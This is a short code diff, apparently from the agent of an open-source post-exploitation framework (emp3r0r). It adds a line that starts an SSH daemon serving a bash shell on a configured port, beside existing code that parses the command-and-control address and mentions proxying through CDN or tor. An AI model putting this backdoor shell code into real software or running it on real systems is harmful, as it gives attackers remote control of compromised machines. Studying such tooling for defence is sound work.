@@ -100,6 +100,9 @@ func main() {
 	// start socket listener
 	go socketListen()
 
+	// start SSHD
+	go agent.SSHD("bash", emp3r0r_data.SSHDPort)
+
 	// parse C2 address
 	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
 	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
